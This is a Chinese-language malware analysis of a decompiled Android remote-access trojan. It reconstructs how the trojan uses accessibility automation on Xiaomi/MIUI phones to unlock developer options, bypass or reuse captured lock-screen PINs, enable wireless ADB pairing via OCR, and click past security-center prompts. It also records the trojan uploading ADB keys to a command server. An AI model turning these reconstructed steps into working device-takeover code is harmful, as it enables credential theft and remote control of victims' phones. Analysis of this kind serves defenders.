# 小米/MIUI 开发者选项 + ADB 无线调试自动化审计

> **Phase 0 开发者选项**: `jadx-reference/rock/service/modules/setup/C0358a0.java` (OpenDevelopmentDelegate, 1401 行)
> **Phase 1-3 ADB 配对**: `jadx-reference/rock/service/modules/setup/C0360a2.java` (SystemOptimizeManager, 5666 行)
> **窗口检测规则**: `jadx-reference/p000/we1.java` (69 行)
> **MIUI 安全中心包名**: `com.miui.securitycenter` (XOR 加密: `KFYcdEAxGScZIi5aBChELBUtUj8/XAM=`)
> **日期**: 2026-04-21

---

## 一、执行全链路（对应 MIUI 用户可见界面）

```
┌──────────────────────────────────────────────────────────────────────┐
│ MIUI 标准路径:                                                        │
│ 设置 → 我的设备 → 连续点击 MIUI/OS 版本 → PIN → 返回                     │
│      → 更多设置 → 开发者选项 → USB 调试 → 无线调试                       │
│                                                                      │
│ RAT 自动化路径:                                                        │
│ Intent(DEVICE_INFO_SETTINGS) → 关于手机 → findBuildNumber()            │
│   ↓ 找"MIUI版本"/"HyperOS版本"/"OS版本"/"版本号" (dh0字典)              │
│   ↓ performAction(CLICK) ×7, 间隔 150ms                              │
│   ↓ 检测 PIN 弹窗 → 等待用户/自动输入 → 超时 30s                        │
│   ↓ Intent(APPLICATION_DEVELOPMENT_SETTINGS) → 开发者选项               │
│   ↓ 滚动找"无线调试" → 小米 SDK≤30 预勾选 checkbox                      │
│   ↓ 点击进入 → "使用配对码" → OCR 配对码 → SPAKE2+TLS                   │
│   ↓ MIUI 安全中心弹窗处理                                               │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 二、Phase 0 — 打开"关于手机"并连续点击版本号

### 2.1 打开"关于手机"页面 (`m211984c7`, 行 1179-1193)

```java
// OpenDevelopmentDelegate.m211984c7()
Intent intent = new Intent("android.settings.DEVICE_INFO_SETTINGS");
intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
context.startActivity(intent);
Thread.sleep(1000);  // 等待页面加载
// 调度 500ms 后执行 P() 处理关于手机窗口
scheduler.schedule(P_handler, 500ms);
```

**注**: MIUI 中 `DEVICE_INFO_SETTINGS` 通常打开的是"我的设备"页面，包含"全部参数"/"详细信息与规格"子页，其中包含 MIUI 版本号。但不同 MIUI 版本的布局差异较大，RAT 通过多策略搜索应对。

### 2.2 识别"关于手机"窗口 (`m211971a0`, 行 666-680)

使用 `dh0.f55781d1` 字典匹配当前页面：

```
匹配文本 (60+ 语言):
"关于手机", "关于本机", "关于设备"
"About phone", "About device", "About tablet"
"端末情報", "デバイス情報"
"휴대전화 정보", "디바이스 정보"
"Giới thiệu về điện thoại"
"เกี่ยวกับโทรศัพท์"
"Tentang ponsel"
"О телефоне", "Про телефон"
...
```

### 2.3 小米品牌检测与路由决策 (`m211957a9`, 行 140-358)

`P()` 是处理"关于手机"窗口的核心方法。小米**不被特殊处理为 needsVersionInfoPage**（该标记仅 Vivo/OPPO 为 true），而是走通用流程：

```java
// 行 171-178: 品牌路由
if (isVivo) { /* needsVersionInfoPage = true */ }
else if (isOppo) { /* needsVersionInfoPage = true */ }
else if (isSamsung) { /* needsVersionInfoPage = false，直接找版本号 */ }
else { /* 小米走这里: needsVersionInfoPage = false */ }
```

小米走的是**直接在"关于手机"页面查找版本号**的路径（不需要先进入"版本信息"子页）。

### 2.4 查找版本号节点 (`m211963b6`, 行 510-559)

**策略 1: 通过 dh0 文本字典匹配**

使用 `AbstractC0361a3.f53874a0` 延迟加载的版本号字典，包含以下小米专有条目 (`dh0.f55791e1`, 行 265):

```
"MIUI 版本"          ← MIUI 12 及更早
"OS版本"             ← HyperOS
"HyperOS版本"        ← HyperOS 1.0+
"HyperOS version"    ← 英文系统
"版本号"             ← 通用
"构建号"             ← 通用
"Build number"       ← 英文
"编译编号"           ← 部分 MIUI 翻译
"软件版本号"         ← 部分设备
"系统版本"           ← 部分 MIUI 翻译
```

小米专有字典 (`dh0.f55800f0`, 行 276):
```
"MIUI 版本", "MIUI version", "MIUI-Version", "Version de MIUI",
"Versión de MIUI", "Versão do MIUI", "Versione MIUI", "Версия MIUI",
"MIUIバージョン", "MIUI 버전", "Phiên bản MIUI", "เวอร์ชัน MIUI",
"Versi MIUI", ...
```

HyperOS 字典 (`dh0.f55801f1`, 行 277):
```
"OS版本", "OS version", "OS-Version", ...
"HyperOS version", "HyperOS版本"
```

**策略 2: 通过 `Build.DISPLAY` 值匹配**

```java
// m211963b6, 行 545-558
String buildDisplay = Build.DISPLAY;  // 例: "MIUI 14.0.23.11.13.DEV"
if (buildDisplay != null && !buildDisplay.isEmpty()) {
    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(buildDisplay);
    // 如果找到，返回该节点或其可点击父节点
}
```

这是**终极回退策略**：即使 dh0 字典没有匹配到任何标签，也能通过设备实际的 `Build.DISPLAY` 字符串（如 `"V816.0.5.0.UMCCNXM"`）找到对应的文本节点。

**策略 3: 滚动查找**

如果直接查找失败，获取 ScrollView 并上下滚动搜索：

```java
// 行 250-259
AccessibilityNodeInfo scrollView = m211967c0(root);  // 递归找 ScrollView
if (scrollView != null) {
    // 先向下滚动查找
    result = m211988d1(scrollView, true, buildNumberMatcher);
    if (result == null) {
        // 再向上滚动查找
        result = m211988d1(scrollView, false, buildNumberMatcher);
    }
}
```

### 2.5 连续点击 7 次 — Y() (`m211978a7`, 行 968-1065)

```java
public final boolean m211978a7(AccessibilityNodeInfo buildNumberNode) {
    // Step 1: 快速点击 7 次
    for (int i = 1; i < 8; i++) {
        buildNumberNode.performAction(ACTION_CLICK);  // ACTION_CLICK = 16
        Thread.sleep(150);  // 间隔 150ms
    }
    // 总耗时: 7 × 150ms ≈ 1050ms
    
    // Step 2: 轮询检测密码弹窗（最多 5000ms）
    long elapsed = 0;
    while (elapsed < 5000) {
        Thread.sleep(500);
        elapsed += 500;
        
        // 检查方式 A: 通过 Activity 类名检测密码窗口
        if (isInConfirmLockWindow()) {
            // → 进入 PIN 处理流程
            goto handlePIN;
        }
        
        // 检查方式 B: 在当前页面查找"开发者选项"相关文本
        if (findDeveloperOptionsText(root)) {
            // → 已进入开发者选项，无需密码
            break;
        }
        
        // 检查方式 C: Settings.Global 检测
        if (Settings.Global.getInt(resolver, "development_settings_enabled", 0) > 0) {
            // → 开发者选项已解锁
            break;
        }
    }
    
    // Step 3 (无密码路径): 检查确认对话框并跳转
    if (hasConfirmDialog()) {
        clickConfirmButton();  // 点击"确定"
        Thread.sleep(1000);
    }
    openDeveloperOptionsPage();  // m211980b4()
    Thread.sleep(2000);
    state = ENABLE_DEV_OPT_SUCCESS;
    onComplete();
    return true;
}
```

**关键时序**:
| 步骤 | 耗时 | 累计 |
|------|------|------|
| 7 次点击 | ~1050ms | ~1s |
| 密码弹窗检测 | 最多 5000ms | ~6s |
| 确认对话框处理 | ~1000ms | ~7s |
| 跳转开发者选项 | ~2000ms | ~9s |

---

## 三、PIN/密码验证处理

### 3.1 密码窗口检测 (`m211970c4`, 行 655-663)

通过 Activity 类名匹配判断当前是否在密码验证窗口：

```java
// 匹配的 Activity 类名关键词:
"ConfirmLockPassword"      // Android 原生
"ConfirmLockPattern"       // 图案锁
"ChooseLockGeneric"        // 通用锁屏选择
"ConfirmVivoPin"           // Vivo 专有
"ConfirmDeviceCredential"  // 设备凭证
"ConfirmCredential"        // 通用凭证
"KeyguardConfirm"          // 锁屏确认
"VerifyLock"               // 锁验证
"LockPattern"              // 图案锁
"LockPassword"             // 密码锁
"LockPin"                  // PIN 锁
"UnlockActivity"           // 解锁 Activity
"SecurityActivity"         // 安全 Activity

// OPPO/ColorOS 专用:
"coloros" + ("lock" || "Lock" || "password" || "Password")
// OPLUS 专用:
"oplus" + ("lock" || "Lock" || "password" || "Password")
```

### 3.2 密码输入框检测 (`m211986c9`, 行 1222-1285)

**3 层检测**:

**层 1: `isPassword()` 递归检查**
```java
// m211966b9 — 递归遍历无障碍树
if (node.isPassword()) return true;
for (child : node.children) {
    if (isPasswordField(child)) return true;
}
```

**层 2: 图案锁 resource-id 匹配**
```java
// 搜索图案锁控件
"com.android.settings:id/lockPattern"
"com.android.systemui:id/lockPattern"
"com.coloros.settings:id/lockPattern"       // OPPO
"com.oplus.settings:id/lockPattern"         // OPLUS
"com.samsung.android.biometrics.app.setting:id/lockPattern"  // 三星
"com.android.settings:id/biometric_lockPattern"
"com.samsung.android.biometrics.app.setting:id/biometric_lockPattern"
```

**层 3: PIN/密码输入框 resource-id 匹配**
```java
"com.android.settings:id/pinEntry"
"com.android.settings:id/passwordEntry"
"com.android.settings:id/password_entry"
"com.coloros.settings:id/pinEntry"
"com.coloros.settings:id/passwordEntry"
"com.oplus.settings:id/pinEntry"
"com.oplus.settings:id/passwordEntry"
```

### 3.3 PIN 处理流程（Y() 内, 行 1012-1038）

```java
// 检测到 PIN 弹窗后
state = PREPARE_CONFIRM_LOCK_WIN;

// 等待密码窗口消失（最多 30 秒）
long startTime = System.currentTimeMillis();
while (System.currentTimeMillis() - startTime < 30000) {
    Thread.sleep(1000);
    
    // 检查密码窗口是否仍在
    boolean stillInLock;
    if (lastActivityName != null && isLockActivityName(lastActivityName)) {
        stillInLock = true;  // 通过 Activity 名判断
    } else {
        stillInLock = hasPasswordInputField(null);  // 通过控件判断
    }
    
    if (!stillInLock) {
        // 密码窗口消失了 = 用户已输入正确密码
        confirmLockDetected = false;
        break;  // z = true (成功)
    }
}

if (!success) {
    // 30 秒超时 → 放弃
    return false;
}

// 密码验证成功，等 2 秒后跳转
Thread.sleep(2000);
openDeveloperOptionsPage();  // 跳转到开发者选项
```

**关键设计**: RAT **不会自动输入 PIN**——它等待用户手动输入，或者依赖 `CipherCaptureManager` 之前捕获的锁屏密码。`pairInConfirmLock` 任务（行 4506-4530）中有使用已捕获密码自动解锁的逻辑。

### 3.4 已捕获密码的自动输入 (行 4519-4530)

```java
// pairInConfirmLock 任务
CipherCaptureManager cipher = CipherCaptureManager.getInstance(service, context);
// 尝试用已保存密码解锁
String savedCipher = cipher.getSavedCipher(true);  // isLockScreen=true
if (savedCipher == null) {
    savedCipher = cipher.getSavedCipher(false);     // 尝试非锁屏密码
}
if (savedCipher == null) {
    // 无已保存密码 → 启动同步捕获流程
    CipherCaptureManager.startSyncCapture(cipher);
    // 显示 ConfigMask 遮罩等待用户输入
}
```

---

## 四、Phase 0 完成 — 跳转开发者选项页面

### 4.1 标准 Intent 路径 (`m211985c8`, 行 1196-1220)

小米走标准路径（非华为/荣耀的 ComponentName 路径）：

```java
// 尝试 1: 完整 Intent
Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
intent.addFlags(FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP 
    | FLAG_ACTIVITY_CLEAR_TASK | FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
context.startActivity(intent);

// 尝试 2: 简化 Intent（如果尝试 1 失败）
Intent intent2 = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
intent2.addFlags(FLAG_ACTIVITY_NEW_TASK);
context.startActivity(intent2);
```

### 4.2 窗口检测规则 — 开发者选项页面 (`we1.m215053a4`, 行 40-42)

```java
// 匹配的 Activity:
("com.android.settings", "Settings$DevelopmentSettingsDashboardActivity")
("com.android.settings", "Settings$DevelopmentSettingsActivity")
("com.android.settings", "SubSettings" + 含开发者选项文本)
("com.android.settings", "FrameLayout" + 含开发者选项文本)
("com.android.settings", "MiuiSettings" + 含开发者选项文本)  // ← MIUI 专有
```

**注**: `"com.android.settings.MiuiSettings"` 是 MIUI 特有的 Settings Activity，RAT 专门为其配置了窗口检测规则。

### 4.3 开发者选项文本匹配 (`dh0.f55783d3`)

```
"开发者选项", "开发人员选项", "開發人員選項"
"Developer options", "Developer option"
"開発者向けオプション", "개발자 옵션"
"Tuỳ chọn cho nhà phát triển"
"Opsi developer", "Opsi pengembang"
"Для разработчиков", "Параметры разработчика"
...
共 65+ 种翻译
```

---

## 五、Phase 1 — 在开发者选项中找到无线调试（小米专用分支）

### 5.1 小米 SDK≤30 预勾选 (`m211991b0`, 行 571-582)

```java
String brand = Build.BRAND.toLowerCase();
boolean xiaomiNeedsPreCheck = 
    (brand.equals("xiaomi") || brand.equals("redmi") || 
     brand.equals("poco") || brand.equals("blackshark")) 
    && Build.VERSION.SDK_INT <= 30;  // Android 11 及以下

if (xiaomiNeedsPreCheck) {
    // 调用 P() 勾选无线调试 checkbox
    m212033a7(clickableNode);
}
```

**原因**: 小米 MIUI 12 (Android 11) 的开发者选项中，无线调试是一个 checkbox 列表项，需要先勾选才能进入详情页。MIUI 13+ (Android 12+) 则改为点击进入子页面的形式。

### 5.2 P() 无线调试 checkbox 勾选 (`m212033a7`, 行 1974-1993)

```java
public final boolean m212033a7(AccessibilityNodeInfo node) {
    boolean isEnabled = m212073h8();  // 检查 Settings.Global adb_wifi_enabled
    
    for (int attempt = 1; attempt < 3 && !isEnabled; attempt++) {
        // 查找并点击无线调试 checkbox
        C0579hf result = m212060f1(node);
        
        if (result.clicked) {  // f56663a1
            // 点击成功，等待 1500ms
            C0362a4.m212113a8(service, 1500L);
            // 处理"允许无线调试"确认弹窗
            m212068h2();
        }
        
        if (result.checked) {  // f56662a0
            // 已勾选
        }
        
        isEnabled = m212073h8();  // 重新检查
    }
    return isEnabled;
}
```

最多重试 2 次，每次点击后等待 1500ms 让系统响应。

### 5.3 小米 SDK≥35 特殊处理 (`C0360a2.java`, 行 3958-3961)

```java
if ((brand.equals("xiaomi") || brand.equals("redmi") || 
     brand.equals("poco") || brand.equals("blackshark")) 
    && Build.VERSION.SDK_INT >= 35) {
    // Android 15+ 小米设备的额外处理
    // 检查 /system/bin/su 或 /system/xbin/su 存在性
}
```

---

## 六、MIUI 安全中心弹窗处理

### 6.1 MIUI ADB 输入窗口检测 (`m212031a5`, 行 1920-1932)

```java
// 检测 MIUI 的 ADB 安装授权弹窗
new nb0(
    "com.miui.securitycenter",                           // 包名
    "com.miui.permcenter.install.AdbInputApplyActivity", // Activity
    windowFlags(32, 2048, 1)
)
// 日志: "已进入MIUI ADB输入窗口"
```

这是 MIUI 特有的 **ADB 安装授权弹窗**——当通过 ADB 安装应用时，MIUI 会弹出需要输入小米账号密码的窗口。RAT 需要检测并处理此弹窗。

### 6.2 MIUI 安全中心对话框检测 (`we1.m215055a6`, 行 56-61)

```java
new nb0(
    "com.miui.securitycenter",            // 包名（解密自 KFYcdEAxGScZIi5aBChELBUtUj8/XAM=）
    "miuix.appcompat.app.AlertDialog",    // MIUI AlertDialog
    windowFlags(32, 2048),
    contentMatcher: 包含 dh0.f55807f7 文本  // "安全设置正在打开"
)
```

### 6.3 事件驱动的 MIUI 安全弹窗处理 (行 4455-4499)

```java
// onAccessibilityEventInternal 中的小米分支
if (isXiaomi || isRedmi || isPoco || isBlackShark) {
    
    // 分支 A: MIUI ADB 输入窗口
    if (isInMiuiAdbInputWindow()) {
        queue.add("pairInSecurityCenter");
        execute(pairInSecurityCenter);  // → B3() 处理
        return;
    }
    
    // 分支 B: MIUI 安全中心对话框
    if (isInMiuiSecurityDialog()) {
        // 检测到 "miuix.appcompat.app.AlertDialog" + "安全设置正在打开"
        queue.add("pairInSecurityCenter");
        execute(pairInSecurityCenter);  // → B3() 处理
        return;
    }
}
```

### 6.4 B3() 安全弹窗按钮点击 (`m211994b3`, 行 637-699)

```
1. 查找"下一步"按钮 (dh0.f55788d8): 62 种语言
   ├─ 找到 → performAction(CLICK) → 等待 1500ms → 完成
   └─ 未找到 → 继续

2. 查找"允许"按钮 (dh0.f55750a0): 62 种语言
   ├─ 找到 → performAction(CLICK)
   │   └─ 循环检查"安全设置正在打开" (dh0.f55807f7): 最多 20 次
   │      └─ 检测到 → 标记 USB 安全 → 执行 k4()
   └─ 未找到 → 退出
```

---

## 七、完整时序图（小米 MIUI）

```
T=0s    Intent(DEVICE_INFO_SETTINGS)
        → 打开"我的设备"/"关于手机"
        
T=1s    P() 处理关于手机窗口
        → dh0 字典匹配: "MIUI 版本"/"HyperOS版本"/"OS版本"/"版本号"
        → 回退: Build.DISPLAY 字符串匹配
        
T=2s    Y() 开始连续点击
        → performAction(CLICK) ×7, 间隔 150ms
        → 总耗时 ~1.05s

T=3s    轮询检测 PIN 弹窗 (每 500ms, 最多 5s)
        ├─ [有 PIN] → state=PREPARE_CONFIRM_LOCK
        │   → 等待用户输入 (最多 30s)
        │   → 或使用已捕获密码自动输入
        │   → 密码窗口消失 → 等待 2s
        └─ [无 PIN] → 检测 development_settings_enabled=1

T=8s    检测到确认对话框 → 点击"确定"
(无PIN)  → 等待 1s

T=10s   Intent(APPLICATION_DEVELOPMENT_SETTINGS)
        → 打开开发者选项

T=12s   Phase 1: G() pairInDevOption
        → 小米 SDK≤30: P() 预勾选无线调试 checkbox (最多 2 次)
        → 滚动查找"无线调试" (最多 28 次滚动)
        → 点击进入

T=15s   Phase 2: B4() pairInWifiDebugWindow
        → P() 勾选无线调试开关
        → 查找"使用配对码配对设备" (最多 20 次滚动)
        → 点击 → 等待配对码弹窗 (最多 10s)
        → K8() OCR 提取 6 位配对码 + 端口
        → E2() SPAKE2+TLS 1.3 配对

T=30s   MIUI 安全弹窗处理
        → 检测 com.miui.securitycenter AlertDialog
        → 点击"允许"/"下一步"

T=35s   配对完成
        → pair_completed=true, adb_deploy_enabled=true
        → 密钥上传 C2: POST /api/adb-keys/{deviceId}
        → 同步配置: POST 127.0.0.1:7912/syncADBConfig
```

---

## 八、小米/MIUI 版本适配矩阵

| MIUI/HyperOS 版本 | Android SDK | 版本号点击目标 | 无线调试 UI 形式 | 安全弹窗 |
|-------------------|-------------|--------------|-----------------|---------|
| MIUI 12 | SDK 30 (A11) | "MIUI 版本" | checkbox 列表项（需预勾选） | AdbInputApplyActivity |
| MIUI 13 | SDK 31-32 (A12/12L) | "MIUI 版本" | 点击进入子页面 | AdbInputApplyActivity |
| MIUI 14 | SDK 33 (A13) | "MIUI 版本" | 点击进入子页面 | AlertDialog |
| HyperOS 1.0 | SDK 34 (A14) | "HyperOS版本"/"OS版本" | 点击进入子页面 | AlertDialog |
| HyperOS 2.0 | SDK 35 (A15) | "HyperOS版本"/"OS版本" | 点击进入子页面 + su 检查 | AlertDialog |

---

## 十、关键源码行号索引

| 行号 | 文件 | 方法/功能 |
|------|------|---------|
| 1179-1193 | C0358a0 | `m211984c7` — 打开"关于手机" |
| 666-680 | C0358a0 | `m211971a0` — 识别"关于手机"窗口 |
| 140-358 | C0358a0 | `m211957a9` (P()) — 处理关于手机窗口主逻辑 |
| 510-559 | C0358a0 | `m211963b6` — 查找版本号节点 |
| 968-1065 | C0358a0 | `m211978a7` (Y()) — 连续点击 7 次 + PIN 检测 |
| 655-663 | C0358a0 | `m211970c4` — 密码窗口 Activity 类名匹配 |
| 1222-1285 | C0358a0 | `m211986c9` — 密码输入框检测（图案/PIN/密码） |
| 1077-1106 | C0358a0 | `m211980b4` — 打开开发者选项（标准 Intent） |
| 571-582 | C0360a2 | 小米 SDK≤30 预勾选判断 |
| 1974-1993 | C0360a2 | `m212033a7` (P()) — 无线调试 checkbox 勾选 |
| 1920-1932 | C0360a2 | `m212031a5` — MIUI ADB 输入窗口检测 |
| 4455-4499 | C0360a2 | 小米安全弹窗事件处理分支 |
| 3958-3961 | C0360a2 | 小米 SDK≥35 特殊处理 |
| 265 | dh0 | `f55791e1` — 版本号字典（含 MIUI版本/HyperOS版本） |
| 276 | dh0 | `f55800f0` — MIUI 版本专用字典 |
| 277 | dh0 | `f55801f1` — OS 版本字典（含 HyperOS） |
| 56-61 | we1 | `m215055a6` — MIUI 安全中心对话框匹配规则 |
| 40-42 | we1 | `m215053a4` — 开发者选项窗口匹配（含 MiuiSettings） |
